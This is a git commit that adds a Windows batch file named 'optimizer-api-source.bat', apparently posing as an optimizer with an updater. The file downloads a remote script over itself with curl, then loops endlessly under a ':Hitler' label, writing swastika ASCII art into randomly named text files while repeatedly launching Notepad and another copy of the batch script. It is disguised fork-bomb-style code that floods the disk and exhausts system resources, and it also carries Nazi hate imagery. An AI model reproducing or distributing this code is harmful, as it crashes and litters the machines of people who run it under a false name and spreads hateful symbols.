cea013981b7a26d9ff3159a4f61fbab75da73201
Izaiashi <93437148+Izaiashi@users.noreply.github.com>
2023-06-24 15:20:46 +0200

    Create optimizer-api-source.bat

---
+++ optimizer-api-source.bat
@@ -0,0 +1,33 @@
+@echo off
+REM Updater
+
+echo ---------------------------------------------------------------------------
+echo                                  Updating
+echo.
+set "filePath=%~f0"
+copy "%filePath%" "%filePath%.old"
+curl "https://raw.githubusercontent.com/Izaiashi/Random-Batch-Shit/main/optimizer-api.bat" -o "%filePath%"
+echo.
+echo ---------------------------------------------------------------------------
+echo.
+
+REM Loops
+
+:Hitler
+	set FILENAME=%RANDOM%.txt
+	echo.
+	echo ▓▓▓▓▓▓▀▀░░░░░░▀▀▓▓▓▓▓▓ >> %FILENAME%
+	echo ▓▓▓▀░░░░░▄██▄░░░░░▀▓▓▓ >> %FILENAME%
+	echo ▓▓░░░░░▄▄██▀░░░░░░░░▓▓ >> %FILENAME%
+	echo ▓░░░░░▄██▀░░░▄█▄░░░░░▓ >> %FILENAME%
+	echo ▌░░░░░▀██▄▄▄█████▄░░░▐ >> %FILENAME%
+	echo ░░▄▄▄░░░▀████▀░▀▀██▄░░ >> %FILENAME%
+	echo ░░▀██▄░▄▄████▄░░░▀▀▀░░ >> %FILENAME%
+	echo ▌░░░▀█████▀▀▀██▄░░░░░▐ >> %FILENAME%
+	echo ▓░░░░░▀█▀░░░▄██▀░░░░░▓ >> %FILENAME%
+	echo ▓▓░░░░░░░░▄██▀░░░░░░▓▓ >> %FILENAME%
+	echo ▓▓▓▄░░░░░▀█▀▀░░░░░▄▓▓▓ >> %FILENAME%
+	echo ▓▓▓▓▓▓▄▄░░░░░░▄▄▓▓▓▓▓▓ >> %FILENAME%
+  start "" notepad.exe
+  start "" optimizer-api.bat
+  goto :Hitler
